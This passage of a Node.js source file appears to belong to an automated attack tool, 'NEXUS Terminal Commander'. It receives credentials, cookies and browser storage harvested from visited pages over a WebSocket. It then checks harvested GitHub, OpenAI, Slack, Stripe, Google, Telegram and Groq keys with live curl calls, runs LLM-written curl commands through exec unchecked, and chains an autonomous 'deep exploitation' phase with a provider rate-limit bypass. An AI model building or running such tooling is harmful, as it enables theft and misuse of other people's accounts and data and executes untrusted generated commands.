        this.isRunning = false;
        log('🛑 AI Brain stopping...', 'yellow');
    },

    // Get status
    status() {
        return {
            running: this.isRunning,
            thinking: this.isThinking,
            cycle: this.stats.cyclesCompleted,
            commands: this.stats.commandsExecuted,
            discoveries: this.stats.vulnerabilitiesFound,
            goals: this.memory.goals.length,
            focus: this.memory.currentFocus
        };
    },

    // Delay helper
    delay(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// 🔄 FULL AUTOMATION ENGINE - ONE CLICK TO EVERYTHING
// ══════════════════════════════════════════════════════════════════════════════

const FullAutomation = {
    isRunning: false,
    ws: null,

    // Start full automation - user just watches
    async start(ws, findings, browserData) {
        if (this.isRunning) {
            log('⚠️ Full automation already running', 'yellow');
            return;
        }

        this.isRunning = true;
        this.ws = ws;

        logBox('🚀 FULL AUTOMATION STARTED', [
            'The AI will now take over completely.',
            '',
            `Domain: ${browserData.domain}`,
            `Findings: ${findings.length}`,
            '',
            'Phases:',
            '  1. Token Testing (validate all credentials)',
            '  2. AI Brain Analysis (autonomous thinking)',
            '  3. Deep Exploitation (extract data)',
            '  4. Report Generation',
            '',
            'Sit back and watch the magic happen!',
            'Type "automation.stop()" to stop'
        ], 'cyan');

        try {
            // Phase 1: Test all tokens first
            if (findings.length > 0) {
                log('\n📊 PHASE 1: Token Testing', 'yellow');
                await TokenTester.testAll(findings);
                await this.delay(2000);

                // Update findings with live status
                const liveTokens = TokenTester.liveTokens;
                findings = findings.map(f => {
                    const live = liveTokens.find(l => l.value === f.value);
                    if (live) {
                        return { ...f, live: true, liveResult: live.result };
                    }
                    return f;
                });
            }

            // Phase 2: Launch AI Brain
            if (this.isRunning) {
                log('\n🧠 PHASE 2: AI Brain Activation', 'magenta');
                AIBrain.init(ws, findings, browserData.domain);
                await AIBrain.startThinking();
            }

            // Phase 3: Autonomous Exploitation if vulnerabilities found
            if (this.isRunning && AIBrain.stats.vulnerabilitiesFound > 0) {
                log('\n💀 PHASE 3: Deep Exploitation', 'red');
                AutonomousExploiter.init(ws);
                await AutonomousExploiter.run(
                    findings.filter(f => f.live),
                    browserData
                );
            }

            // Phase 4: Final Report
            this.generateMasterReport(browserData);

        } catch (e) {
            log(`❌ Automation error: ${e.message}`, 'red');
        } finally {
            this.isRunning = false;
            log('\n✅ Full automation complete!', 'green');
        }
    },

    // Generate master report combining all phases
    generateMasterReport(browserData) {
        const allDiscoveries = [
            ...AIBrain.memory.discoveries,
            ...AutonomousExploiter.vulnerabilitiesFound
        ];

        logBox('🏆 MASTER AUTOMATION REPORT', [
            `Domain: ${browserData.domain}`,
            `Total Time: ${this.calculateDuration()}`,
            '',
            '=== TOKEN TESTING ===',
            `Total Tested: ${TokenTester.stats.total}`,
            `Live Tokens: ${TokenTester.stats.live}`,
            '',
            '=== AI BRAIN ===',
            `Thinking Cycles: ${AIBrain.stats.cyclesCompleted}`,
            `Commands Executed: ${AIBrain.stats.commandsExecuted}`,
            `Discoveries: ${AIBrain.stats.vulnerabilitiesFound}`,
            '',
            '=== EXPLOITATION ===',
            `Exploits Run: ${AutonomousExploiter.executedCommands?.size || 0}`,
            `Confirmed Vulns: ${AutonomousExploiter.vulnerabilitiesFound?.length || 0}`,
            `Scripts Generated: ${AutonomousExploiter.scriptsGenerated?.length || 0}`,
            '',
            '=== ALL DISCOVERIES ===',
            ...allDiscoveries.slice(0, 8).map((d, i) =>
                `[${i + 1}] ${d.type || d.analysis?.vulnerabilityType || 'Unknown'}`
            ),
            '',
            `TOTAL VULNERABILITIES: ${allDiscoveries.length}`
        ], 'green');

        // Send to browser
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'master_report',
                report: {
                    domain: browserData.domain,
                    tokenStats: TokenTester.stats,
                    brainStats: AIBrain.stats,
                    exploitStats: AutonomousExploiter.status(),
                    discoveries: allDiscoveries,
                    liveTokens: TokenTester.liveTokens
                }
            }));
        }
    },

    calculateDuration() {
        // Return formatted duration
        return 'N/A';
    },

    stop() {
        this.isRunning = false;
        AIBrain.stop();
        AutonomousExploiter.stop();
        TokenTester.isRunning = false;
        log('🛑 Full automation stopped', 'yellow');
    },

    delay(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// DATA STORE - SHARED BETWEEN BROWSER AND TERMINAL
// ══════════════════════════════════════════════════════════════════════════════

const DataStore = {
    data: {
        findings: [],
        exploitResults: [],
        browserData: {},
        terminalCommands: [],
        aiConversations: [],
        sessions: [],
        custom: {}  // Custom key-value storage
    },

    // Load from file
    load() {
        try {
            if (fs.existsSync(CONFIG.DATA_FILE)) {
                const content = fs.readFileSync(CONFIG.DATA_FILE, 'utf8');
                this.data = JSON.parse(content);
                // Ensure custom object exists
                if (!this.data.custom) this.data.custom = {};
                log(`Loaded ${this.data.findings.length} findings from storage`, 'blue');
            }
        } catch (e) {
            log(`Could not load data: ${e.message}`, 'yellow');
        }
    },

    // Save to file
    save() {
        try {
            fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(this.data, null, 2));
        } catch (e) {
            log(`Could not save data: ${e.message}`, 'yellow');
        }
    },

    // Custom key-value setters/getters
    setCustom(key, value) {
        if (!this.data.custom) this.data.custom = {};
        this.data.custom[key] = {
            value,
            timestamp: new Date().toISOString()
        };
        this.save();
        return true;
    },

    getCustom(key) {
        if (!this.data.custom || !this.data.custom[key]) return null;
        return this.data.custom[key].value;
    },

    // Add finding from browser
    addFinding(finding) {
        this.data.findings.push({
            ...finding,
            receivedAt: new Date().toISOString()
        });
        this.save();
    },

    // Add exploit result
    addExploitResult(result) {
        this.data.exploitResults.push({
            ...result,
            executedAt: new Date().toISOString()
        });
        this.save();
    },

    // Update browser data
    updateBrowserData(data) {
        this.data.browserData = {
            ...this.data.browserData,
            ...data,
            lastUpdate: new Date().toISOString()
        };
        this.save();
    },

    // Get summary
    getSummary() {
        return {
            totalFindings: this.data.findings.length,
            exploitResults: this.data.exploitResults.length,
            successfulExploits: this.data.exploitResults.filter(r => r.success).length,
            browserConnected: Object.keys(this.data.browserData).length > 0
        };
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// WEBSOCKET SERVER - BROWSER COMMUNICATION
// ══════════════════════════════════════════════════════════════════════════════

const connectedBrowsers = new Map();
let wsServer = null;

// === MESSAGE QUEUE FOR NON-BLOCKING PROCESSING ===
const messageQueue = {
    queue: [],
    processing: false,
    maxConcurrent: 3,
    activeCount: 0,

    add(clientId, message, ws) {
        this.queue.push({ clientId, message, ws, addedAt: Date.now() });
        this.process();
    },

    async process() {
        if (this.processing || this.activeCount >= this.maxConcurrent || this.queue.length === 0) return;

        this.processing = true;
        while (this.queue.length > 0 && this.activeCount < this.maxConcurrent) {
            const item = this.queue.shift();
            this.activeCount++;

            // Process in next tick to avoid blocking
            setImmediate(async () => {
                try {
                    await handleBrowserMessage(item.clientId, item.message, item.ws);
                } catch (e) {
                    log(`Queue error: ${e.message}`, 'red');
                } finally {
                    messageQueue.activeCount--;
                    messageQueue.process();
                }
            });
        }
        this.processing = false;
    }
};

function createWebSocketServer(httpServer) {
    wsServer = new WebSocketServer({
        server: httpServer,
        maxPayload: 50 * 1024 * 1024, // 50MB max payload
        perMessageDeflate: {
            zlibDeflateOptions: { chunkSize: 1024, memLevel: 7, level: 3 },
            zlibInflateOptions: { chunkSize: 10 * 1024 },
            clientNoContextTakeover: true,
            serverNoContextTakeover: true,
            serverMaxWindowBits: 10,
            concurrencyLimit: 10,
            threshold: 1024
        }
    });

    wsServer.on('connection', (ws, req) => {
        const clientId = generateToken().substring(0, 8);
        const clientIP = req.socket.remoteAddress;

        // Set WebSocket options for stability
        ws.isAlive = true;
        ws.on('pong', () => { ws.isAlive = true; });

        connectedBrowsers.set(clientId, {
            ws,
            ip: clientIP,
            authenticated: false,
            tabs: [],
            connectedAt: new Date().toISOString(),
            messageCount: 0,
            lastMessage: Date.now()
        });

        log(`🔌 Browser connected: ${clientId} from ${clientIP}`, 'green');

        // Send welcome with full capabilities info
        ws.send(JSON.stringify({
            type: 'welcome',
            clientId,
            message: 'NEXUS Terminal Commander v3.0 connected!',
            serverVersion: CONFIG.VERSION,
            aiEnabled: TerminalAI.config.isActive,
            aiCollaboration: CONFIG.AI_COLLAB_MODE,
            autoSync: CONFIG.AUTO_SYNC,
            capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit', 'batch_execute']
        }));

        ws.on('message', async (data) => {
            try {
                const client = connectedBrowsers.get(clientId);
                if (client) {
                    client.messageCount++;
                    client.lastMessage = Date.now();
                }

                const message = JSON.parse(data.toString());

                // Use queue for heavy messages, direct handling for simple ones
                const heavyTypes = ['ai_agent_report', 'findings', 'browser_data', 'bulk_findings'];
                if (heavyTypes.includes(message.type)) {
                    messageQueue.add(clientId, message, ws);
                } else {
                    await handleBrowserMessage(clientId, message, ws);
                }
            } catch (e) {
                log(`Message error: ${e.message}`, 'red');
            }
        });

        ws.on('close', () => {
            // Get stats BEFORE deleting
            const clientInfo = connectedBrowsers.get(clientId);
            const connAt = clientInfo?.connectedAt ? new Date(clientInfo.connectedAt).getTime() : Date.now();
            const duration = Math.floor((Date.now() - connAt) / 1000);

            connectedBrowsers.delete(clientId);
            log(`🔌 Browser disconnected: ${clientId}`, 'yellow');
            log(`   Session: ${duration}s | Remaining browsers: ${connectedBrowsers.size}`, 'dim');
        });

        // Error handler to prevent crashes
        ws.on('error', (error) => {
            log(`⚠️ WebSocket error for ${clientId}: ${error.message}`, 'red');
        });
    });

    // Heartbeat to keep connections alive
    const heartbeatInterval = setInterval(() => {
        wsServer.clients.forEach((ws) => {
            if (ws.isAlive === false) {
                return ws.terminate();
            }
            ws.isAlive = false;
            ws.ping();
        });
    }, 30000); // Every 30 seconds

    wsServer.on('close', () => {
        clearInterval(heartbeatInterval);
    });
}

async function handleBrowserMessage(clientId, message, ws) {
    const client = connectedBrowsers.get(clientId);
    if (!client) {
        log(`⚠️ Message from unknown client ${clientId}, ignoring`, 'yellow');
        return;
    }

    switch (message.type) {
        // Authentication
        case 'auth':
            if (message.token === CONFIG.AUTH_TOKEN) {
                client.authenticated = true;

                logBox(`🔐 BROWSER AUTHENTICATED`, [
                    `Client: ${clientId}`,
                    `IP: ${client.ip}`,
                    `AI: ${TerminalAI.config.isActive ? 'Enabled (' + CONFIG.AI_PROVIDER + ')' : 'Disabled'}`,
                    `Collaboration: ${CONFIG.AI_COLLAB_MODE ? 'ACTIVE' : 'Off'}`,
                    `Auto-Sync: ${CONFIG.AUTO_SYNC ? 'ACTIVE' : 'Off'}`
                ], 'green');

                ws.send(JSON.stringify({
                    type: 'auth_success',
                    aiEnabled: TerminalAI.config.isActive,
                    aiCollaboration: CONFIG.AI_COLLAB_MODE,
                    autoSync: CONFIG.AUTO_SYNC,
                    capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit']
                }));

                // AUTO-SYNC: Request all data from browser immediately after auth
                if (CONFIG.AUTO_SYNC) {
                    log('🔄 Auto-sync: Requesting data from browser...', 'blue');

                    // Request findings
                    setTimeout(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'terminal_command',
                                command: 'get_findings',
                                data: {},
                                timestamp: Date.now()
                            }));
                        }
                    }, 1000);

                    // Request all data
                    setTimeout(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'terminal_command',
                                command: 'get_all_data',
                                data: {},
                                timestamp: Date.now()
                            }));
                        }
                    }, 2000);

                    // Request cookies & storage
                    setTimeout(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'terminal_command',
                                command: 'get_cookies',
                                data: {},
                                timestamp: Date.now()
                            }));
                            ws.send(JSON.stringify({
                                type: 'terminal_command',
                                command: 'get_storage',
                                data: {},
                                timestamp: Date.now()
                            }));
                        }
                    }, 3000);

                    // Setup periodic sync
                    if (CONFIG.SYNC_INTERVAL > 0) {
                        const syncInterval = setInterval(() => {
                            if (ws.readyState !== WebSocket.OPEN) {
                                clearInterval(syncInterval);
                                return;
                            }
                            ws.send(JSON.stringify({
                                type: 'terminal_command',
                                command: 'sync',
                                data: {},
                                timestamp: Date.now()
                            }));
                        }, CONFIG.SYNC_INTERVAL);
                    }
                }
            } else {
                log(`❌ Auth failed for ${clientId}`, 'red');
                ws.send(JSON.stringify({ type: 'auth_failed' }));
            }
            break;

        // AI AGENT PRO REPORT FROM BROWSER - DEEP ANALYSIS MODE
        case 'ai_agent_report':
            if (!client.authenticated) return;

            const report = message.report;
            const stats = message.stats;

            logBox(`🤖 AI AGENT PRO REPORT RECEIVED`, [
                `═══════════════════════════════════════════════`,
                `📊 SUMMARY`,
                `  Total Findings: ${report?.summary?.totalFindings || 0}`,
                `  Critical: ${report?.summary?.criticalCount || 0}`,
                `  High: ${report?.summary?.highCount || 0}`,
                `  Validated Live: ${report?.summary?.validatedLive || 0}`,
                `  Risk Level: ${report?.summary?.riskLevel || 'UNKNOWN'}`,
                `  Estimated Bounty: ${report?.summary?.estimatedBounty || '$0'}`,
                `  False Positives Filtered: ${report?.meta?.falsePositivesFiltered || 0}`,
                `═══════════════════════════════════════════════`,
                `🔍 ANALYSIS STATS`,
                `  Tokens Analyzed: ${stats?.tokensAnalyzed || 0}`,
                `  APIs Tested: ${stats?.apisTested || 0}`,
                `  Valid Tokens: ${stats?.tokensValid || 0}`,
                `  Invalid Tokens: ${stats?.tokensInvalid || 0}`,
                `═══════════════════════════════════════════════`
            ], 'magenta');

            // Display findings with FULL values (not truncated)
            if (report?.findings && report.findings.length > 0) {
                log('\n📋 DETAILED FINDINGS WITH FULL DATA:', 'yellow');
                report.findings.forEach((f, i) => {
                    const sev = f.severity || 'UNKNOWN';
                    const sevColor = sev === 'CRITICAL' ? 'red' : sev === 'HIGH' ? 'yellow' : 'cyan';
                    const liveTag = f.testResult?.live ? `${C.green}[LIVE]${C.reset}` : `${C.dim}[DEAD]${C.reset}`;

                    console.log(`\n${C[sevColor]}[${i + 1}] ${sev} - ${f.type}${C.reset} ${liveTag}`);
                    // Show FULL value for terminal - use fullValue if available, otherwise value
                    const fullVal = f.fullValue || f.value;
                    console.log(`${C.white}    Value: ${fullVal}${C.reset}`);
                    console.log(`${C.cyan}    Source: ${f.source?.type || 'unknown'} → ${f.source?.location || 'unknown'}${C.reset}`);
                    if (f.source?.file) console.log(`${C.blue}    File: ${f.source.file}${C.reset}`);
                    console.log(`${C.magenta}    Service: ${f.aiAnalysis?.service || 'unknown'} | Bounty: ${f.aiAnalysis?.bountyEstimate || 'N/A'}${C.reset}`);
                    if (f.testResult?.permissions?.length > 0) {
                        console.log(`${C.yellow}    Permissions: ${f.testResult.permissions.join(', ')}${C.reset}`);
                    }
                });
            }

            // Display source analysis
            if (report?.sourceAnalysis && report.sourceAnalysis.length > 0) {
                log('\n📍 SOURCE ANALYSIS:', 'blue');
                report.sourceAnalysis.forEach(src => {
                    console.log(`${C.cyan}  ${src.sourceType}: ${src.count} findings (${src.criticalCount} critical, ${src.liveCount} live)${C.reset}`);
                });
            }

            // Display recommendations
            if (report?.recommendations && report.recommendations.length > 0) {
                log('\n⚡ RECOMMENDATIONS:', 'green');
                report.recommendations.forEach(rec => {
                    const color = rec.priority === 'CRITICAL' ? 'red' : rec.priority === 'HIGH' ? 'yellow' : 'green';
                    console.log(`${C[color]}  [${rec.priority}] ${rec.action}${C.reset}`);
                    console.log(`${C.dim}    ${rec.details}${C.reset}`);
                });
            }

            // Store report
            DataStore.setCustom('lastAIAgentReport', report);
            DataStore.setCustom('lastAIAgentStats', stats);

            // === MULTI-ANGLE DEEP ANALYSIS + SOURCE-AWARE COMMAND EXECUTION ===
            // 🚀 NOW USES BATCHED ANALYZER - NO MORE RATE LIMITS!
            if (TerminalAI.config.isActive) {
                log('\n🔬 STARTING BATCHED DEEP ANALYSIS (Rate-Limit Proof!)...', 'magenta');
                log('   📍 Using UltraRateLimitBypass + BatchedAnalyzer', 'cyan');

                // Get ALL findings
                const allFindings = report.findings || [];
                const rawFindings = report.rawData?.findings || [];

                // Merge and deduplicate findings
                const findingsMap = new Map();
                [...allFindings, ...rawFindings].forEach(f => {
                    const key = (f.fullValue || f.value || '').substring(0, 50);
                    if (!findingsMap.has(key) || f.fullValue) {
                        findingsMap.set(key, f);
                    }
                });

                const uniqueFindings = Array.from(findingsMap.values());
                log(`   📊 Total unique findings: ${uniqueFindings.length}`, 'cyan');

                // Show UltraBypass status
                UltraRateLimitBypass.showStatus();

                // === BATCHED ANALYSIS (5 findings per AI request) ===
                const batchSize = 5;
                const batches = [];
                for (let i = 0; i < uniqueFindings.length; i += batchSize) {
                    batches.push(uniqueFindings.slice(i, i + batchSize));
                }

                log(`\n   🚀 Processing ${uniqueFindings.length} findings in ${batches.length} batches (instead of ${uniqueFindings.length * 3} individual calls!)`, 'green');

                const liveFindings = [];
                const { exec } = require('child_process');
                const executeCommand = (cmd) => new Promise((resolve) => {
                    exec(cmd, { timeout: 15000 }, (error, stdout, stderr) => {
                        resolve({ stdout, stderr, error: error?.message });
                    });
                });

                for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
                    const batch = batches[batchIndex];

                    console.log(`\n${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                    console.log(`${C.magenta}[BATCH ${batchIndex + 1}/${batches.length}] Analyzing ${batch.length} findings...${C.reset}`);
                    console.log(`${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);

                    // === SINGLE AI CALL FOR ENTIRE BATCH ===
                    const batchPrompt = `BATCH SECURITY ANALYSIS - Analyze ALL ${batch.length} credentials below in ONE response.

${batch.map((f, i) => {
                        const value = (f.fullValue || f.value || '').substring(0, 80);
                        const source = f.source?.type || f.sourceDetails?.type || 'unknown';
                        return `[${i + 1}] TYPE: ${f.type}
    VALUE: ${value}
    SOURCE: ${source} → ${f.source?.location || 'unknown'}`;
                    }).join('\n\n')}

For EACH credential [1] to [${batch.length}], provide:
- service: exact service name (Firebase, OpenAI, GitHub, Slack, AWS, Stripe, Telegram, etc.)
- isFalsePositive: true if placeholder/example/not-real
- curlCommand: ONE curl command to validate it
- bountyEstimate: estimated bounty range

RESPOND WITH ONLY A JSON ARRAY (no other text):
[{"index":1,"service":"ServiceName","isFalsePositive":false,"curlCommand":"curl...","bountyEstimate":"$X-$Y"},...]`;

                    // Smart provider selection
                    const smartResult = await UltraRateLimitBypass.smartRequest(batchPrompt);

                    let batchResults = [];
                    try {
                        const queryOptions = {
                            systemPrompt: 'Elite security researcher. Respond with JSON array ONLY. No explanations.',
                            batchMode: true
                        };

                        if (smartResult.useProvider) {
                            log(`   🔄 Using provider: ${smartResult.useProvider.toUpperCase()}`, 'dim');
                            queryOptions.forceProvider = smartResult.useProvider;
                        }

                        const response = await TerminalAI.query(batchPrompt, queryOptions);

                        if (response && !response.error) {
                            // Cache response
                            UltraRateLimitBypass.cache.set(batchPrompt, response);

                            // Parse JSON array
                            try {
                                const match = response.match(/\[[\s\S]*?\]/);
                                if (match) {
                                    batchResults = JSON.parse(match[0]);
                                }
                            } catch (parseErr) {
                                log(`   ⚠️ Parse error, extracting manually...`, 'yellow');
                                // Try to extract individual results
                                const pattern = /\[(\d+)\][\s\S]*?service[:\s"]+([^",\n]+)/gi;
                                let m;
                                while ((m = pattern.exec(response)) !== null) {
                                    batchResults.push({ index: parseInt(m[1]), service: m[2].trim() });
                                }
                            }
                        }
                    } catch (e) {
                        log(`   ❌ Batch analysis error: ${e.message}`, 'red');
                    }

                    // === PROCESS EACH FINDING IN BATCH ===
                    for (let i = 0; i < batch.length; i++) {
                        const finding = batch[i];
                        const result = batchResults.find(r => r.index === i + 1) || batchResults[i] || {};
                        const fullValue = finding.fullValue || finding.value;

                        console.log(`\n${C.cyan}   [${batchIndex * batchSize + i + 1}/${uniqueFindings.length}] ${finding.type}${C.reset}`);
                        console.log(`${C.dim}      Value: ${(fullValue || '').substring(0, 60)}...${C.reset}`);

                        // Skip false positives
                        if (result.isFalsePositive) {
                            console.log(`${C.yellow}      ⚠️ FALSE POSITIVE - Skipping${C.reset}`);
                            continue;
                        }

                        console.log(`${C.green}      ✅ Service: ${result.service || 'unknown'}${C.reset}`);
                        console.log(`${C.yellow}      💰 Bounty Est: ${result.bountyEstimate || 'TBD'}${C.reset}`);

                        // === EXECUTE VALIDATION COMMANDS (No AI needed!) ===
                        const commandsToExecute = [];

                        // Add AI-suggested command
                        if (result.curlCommand && result.curlCommand.startsWith('curl')) {
                            commandsToExecute.push({ cmd: result.curlCommand, type: 'ai-suggested' });
                        }

                        // Add service-specific commands based on pattern (no AI needed)
                        const serviceLower = (result.service || '').toLowerCase();
                        if (serviceLower.includes('github') || fullValue?.startsWith('gh')) {
                            commandsToExecute.push({
                                cmd: `curl -s -H "Authorization: token ${fullValue}" https://api.github.com/user`,
                                type: 'github'
                            });
                        } else if (serviceLower.includes('openai') || fullValue?.startsWith('sk-')) {
                            commandsToExecute.push({
                                cmd: `curl -s -H "Authorization: Bearer ${fullValue}" https://api.openai.com/v1/models`,
                                type: 'openai'
                            });
                        } else if (serviceLower.includes('slack') || fullValue?.startsWith('xox')) {
                            commandsToExecute.push({
                                cmd: `curl -s -H "Authorization: Bearer ${fullValue}" https://slack.com/api/auth.test`,
                                type: 'slack'
                            });
                        } else if (serviceLower.includes('stripe') || fullValue?.includes('sk_live')) {
                            commandsToExecute.push({
                                cmd: `curl -s -u ${fullValue}: https://api.stripe.com/v1/balance`,
                                type: 'stripe'
                            });
                        } else if (serviceLower.includes('google') || serviceLower.includes('firebase') || fullValue?.startsWith('AIza')) {
                            commandsToExecute.push({
                                cmd: `curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${fullValue}"`,
                                type: 'google'
                            });
                        } else if (serviceLower.includes('telegram')) {
                            commandsToExecute.push({
                                cmd: `curl -s "https://api.telegram.org/bot${fullValue}/getMe"`,
                                type: 'telegram'
                            });
                        } else if (serviceLower.includes('groq') || fullValue?.startsWith('gsk_')) {
                            commandsToExecute.push({
                                cmd: `curl -s -H "Authorization: Bearer ${fullValue}" https://api.groq.com/openai/v1/models`,
                                type: 'groq'
                            });
                        }

                        // Execute commands (limit to 3)
                        let hasLiveResponse = false;
                        for (const { cmd, type } of commandsToExecute.slice(0, 3)) {
                            console.log(`${C.dim}      [${type}] $ ${cmd.substring(0, 70)}...${C.reset}`);

                            try {
                                const result = await executeCommand(cmd);

                                if (result.stdout) {
                                    const output = result.stdout.substring(0, 200);
                                    if (result.stdout.includes('"error"') ||
                                        result.stdout.includes('invalid') ||
                                        result.stdout.includes('unauthorized') ||
                                        result.stdout.includes('REQUEST_DENIED')) {
                                        console.log(`${C.dim}         ⚪ Invalid/Expired${C.reset}`);
                                    } else if (result.stdout.includes('"id"') ||
                                        result.stdout.includes('"login"') ||
                                        result.stdout.includes('"ok":true') ||
                                        result.stdout.includes('"data"')) {
                                        console.log(`${C.red}         🔴 LIVE! Valid response detected${C.reset}`);
                                        console.log(`${C.green}         ${output}${result.stdout.length > 200 ? '...' : ''}${C.reset}`);
                                        hasLiveResponse = true;

                                        liveFindings.push({
                                            type: finding.type,
                                            value: fullValue,
                                            service: result.service,
                                            bounty: result.bountyEstimate,
                                            response: output
                                        });
                                    } else {
                                        console.log(`${C.cyan}         📥 ${output}${C.reset}`);
                                    }
                                }
                            } catch (e) {
                                console.log(`${C.dim}         ⚠️ ${e.message}${C.reset}`);
                            }

                            await new Promise(r => setTimeout(r, 300));
                        }

                        if (hasLiveResponse) {
                            DataStore.addExploitResult({
                                type: finding.type,
                                value: fullValue,
                                service: result.service,
                                bounty: result.bountyEstimate,
                                success: true
                            });
                        }
                    }

                    // Delay between batches (5-8 seconds to respect rate limits)
                    if (batchIndex < batches.length - 1) {
                        const delay = 5000 + Math.random() * 3000;
                        log(`\n   ⏳ Waiting ${Math.round(delay / 1000)}s before next batch...`, 'dim');
                        await new Promise(r => setTimeout(r, delay));
                    }
                }

                // === FINAL SUMMARY ===
                console.log(`\n${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                console.log(`${C.green}   ✅ BATCHED ANALYSIS COMPLETE!${C.reset}`);
                console.log(`${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                log(`   📊 Analyzed: ${uniqueFindings.length} findings in ${batches.length} batches`, 'cyan');
                log(`   🔴 Live Credentials Found: ${liveFindings.length}`, liveFindings.length > 0 ? 'red' : 'dim');
                log(`   📈 AI Calls Made: ${batches.length} (vs ${uniqueFindings.length * 3} without batching!)`, 'green');
                UltraRateLimitBypass.showStatus();
            }

            // Send acknowledgment back to browser
            ws.send(JSON.stringify({
                type: 'report_received',
                status: 'success',
                message: `Report processed: ${report?.summary?.totalFindings || 0} findings analyzed`,
                timestamp: Date.now()
            }));
            break;

        // Receive findings from browser
        case 'findings':
            if (!client.authenticated) return;

            const findingsCount = message.findings?.length || 0;
            const critCount = message.findings?.filter(f => f.severity === 'critical' || f.severity === 'CRITICAL').length || 0;
            const highCount = message.findings?.filter(f => f.severity === 'high' || f.severity === 'HIGH').length || 0;
            const liveCount = message.findings?.filter(f => f.live).length || 0;

            logBox(`📥 FINDINGS RECEIVED FROM BROWSER`, [
                `Total: ${findingsCount} findings`,
                `Critical: ${critCount} | High: ${highCount} | Live: ${liveCount}`,
                `Source: ${message.browserData?.domain || message.browserData?.url || 'unknown'}`,
                `Time: ${new Date().toLocaleTimeString()}`
            ], 'green');

            // Display each finding
            message.findings?.forEach((f, i) => {
                const sev = (f.severity || 'unknown').toUpperCase();
                const sevColor = sev === 'CRITICAL' ? 'red' : sev === 'HIGH' ? 'yellow' : 'cyan';
                const liveTag = f.live ? `${C.green}[LIVE]${C.reset}` : '';
                console.log(`${C[sevColor]}  [${i}] ${sev}${C.reset} ${f.type || f.patternName || '?'}: ${liveTag} ${(f.value || '').substring(0, 55)}...`);
            });

            message.findings?.forEach(f => DataStore.addFinding(f));
            DataStore.updateBrowserData(message.browserData || {});

            // AI Collaboration: Analyze findings and send intelligence back
            if (TerminalAI.config.isActive && findingsCount > 0) {
                log('\n🤖 AI COLLABORATION: Analyzing findings...', 'magenta');

                // Use collaboration mode for bidirectional AI communication
                const collabResult = await TerminalAI.processCollaboration(
                    message.findings,
                    message.browserData || {},
                    ws
                );

                // Also send traditional analysis
                if (!collabResult) {
                    const analysis = await TerminalAI.generateExploitPlan(
                        message.findings,
                        message.browserData || {}
                    );

                    ws.send(JSON.stringify({
                        type: 'ai_analysis',
                        analysis,
                        fromTerminal: true
                    }));
                }
            }

            // Request more data from browser (auto-sync)
            if (CONFIG.AUTO_SYNC) {
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'terminal_command',
                            command: 'get_all_data',
                            data: {},
                            timestamp: Date.now()
                        }));
                    }
                }, 2000);
            }
            break;

        // Receive browser data
        case 'browser_data':
            if (!client.authenticated) return;

            const browserData = message.data;
            const dataType = browserData?.type || browserData?.dataType || 'unknown';

            // Handle different data types from browser
            switch (dataType) {
                case 'findings_data':
                    log(`📥 FINDINGS from browser (${browserData.count} items)`, 'green');
                    if (browserData.findings && browserData.findings.length > 0) {
                        browserData.findings.forEach((f, i) => {
                            console.log(`${C.cyan}  [${i}]${C.reset} ${f.type || f.patternName}: ${(f.value || '').substring(0, 50)}...`);
                        });
                        browserData.findings.forEach(f => DataStore.addFinding(f));
                    }
                    break;

                case 'cookies_data':
                    log(`🍪 COOKIES from ${browserData.url}`, 'yellow');
                    if (browserData.cookies) {
                        const cookies = browserData.cookies.split(';').map(c => c.trim());
                        cookies.forEach(c => {
                            const [name] = c.split('=');
                            console.log(`${C.dim}  ${name}${C.reset}`);
                        });
                    }
                    break;

                case 'storage_data':
                    log(`💾 STORAGE from ${browserData.url}`, 'blue');
                    console.log(`${C.dim}  localStorage: ${Object.keys(browserData.localStorage || {}).length} items${C.reset}`);
                    console.log(`${C.dim}  sessionStorage: ${Object.keys(browserData.sessionStorage || {}).length} items${C.reset}`);
                    break;

                case 'all_data':
                    log(`📦 ALL DATA from ${browserData.data?.url}`, 'magenta');
                    const allData = browserData.data;
                    if (allData) {
                        console.log(`${C.green}  Findings: ${allData.findings?.length || 0}${C.reset}`);
                        console.log(`${C.yellow}  Scripts: ${allData.scripts?.length || 0}${C.reset}`);
                        console.log(`${C.blue}  Forms: ${allData.forms?.length || 0}${C.reset}`);
                        console.log(`${C.cyan}  LocalStorage: ${Object.keys(allData.localStorage || {}).length} items${C.reset}`);
                        DataStore.updateBrowserData(allData);

                        // Save findings
                        if (allData.findings) {
                            allData.findings.forEach(f => DataStore.addFinding(f));
                        }
                    }
                    break;

                case 'html_data':
                    log(`📄 HTML from ${browserData.selector}`, 'blue');
                    console.log(`${C.dim}  Length: ${browserData.html?.length || 0} chars${C.reset}`);
                    break;

                case 'fetch_result':
                    log(`🌐 FETCH ${browserData.status} - ${browserData.url}`, browserData.status < 400 ? 'green' : 'red');
                    if (browserData.data && browserData.data.length < 500) {
                        console.log(`${C.dim}${browserData.data}${C.reset}`);
                    }
                    break;

                case 'fetch_error':
                    log(`❌ FETCH ERROR: ${browserData.error}`, 'red');
                    break;

                case 'eval_result':
                    log(`📤 EVAL RESULT:`, 'green');
                    if (browserData.result !== undefined) console.log(browserData.result);
                    break;

                case 'eval_error':
                    log(`❌ EVAL ERROR: ${browserData.error}`, 'red');
                    break;

                // API Keys from browser
                case 'api_keys':
                    log(`🔑 API KEYS received from browser`, 'green');
                    if (browserData.keys && typeof browserData.keys === 'object') {
